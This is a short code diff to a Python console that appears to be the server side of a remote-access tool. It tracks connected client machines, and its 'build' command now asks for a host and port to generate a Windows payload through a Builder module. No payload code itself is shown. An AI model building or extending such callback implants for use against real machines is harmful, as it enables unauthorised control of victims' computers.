@@ -11,6 +11,7 @@ import time
 import subprocess
 import sys
 import random
+from .builder import Build
 
 clients = [] # A List for client sockets
 hostList = [] # A list for Client userpcs
@@ -1111,14 +1112,10 @@ def Console():
                         """
                         + Style.RESET_ALL)
                 elif(x == "build"):
-                    os.chdir("fhdawn")
-                    if(os.name == "nt"):
-                        subprocess.run(['mingw32-make', 'win-static'])
-                        subprocess.run(['mingw32-make', 'build-win'])
-                    else:
-                        subprocess.run(['make', 'win-static'])
-                        subprocess.run(['make', 'build-win'])
-                    os.chdir("..")
+                    host = input("[+] Host : ")
+                    port = input("[+] Port : ")
+                    if(len(host) > 0 and len(port) > 0):
+                        Build(host, port)
 
                 else:
                     if(len(x) > 0):
